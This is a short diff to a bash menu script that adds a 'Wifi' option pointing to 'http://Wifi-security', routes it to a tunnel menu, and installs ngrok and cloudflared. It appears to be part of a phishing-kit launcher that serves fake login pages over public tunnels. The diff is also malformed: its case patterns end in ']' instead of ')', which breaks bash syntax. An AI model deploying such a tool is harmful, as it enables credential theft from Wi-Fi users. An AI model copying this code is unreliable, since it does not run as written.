@@ -299,5 +299,22 @@ main_menu() {
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
-		1 | 01)
-                       website="
+		1 | 01]
+                       website="Wifi"
+                       url='http://Wifi-security'
+                       tunnel_menu;;
+                0 | 00] 
+                       exit_msg;;
+                *)
+			echo -ne "\n${RED}! Invalid Option, Try Again..."
+			{ sleep 1; main_menu; };;
+	
+	esac
+}
+
+## 
+kill_pid
+dependencies
+install_ngrok
+install_cloudflared
+main_menu   
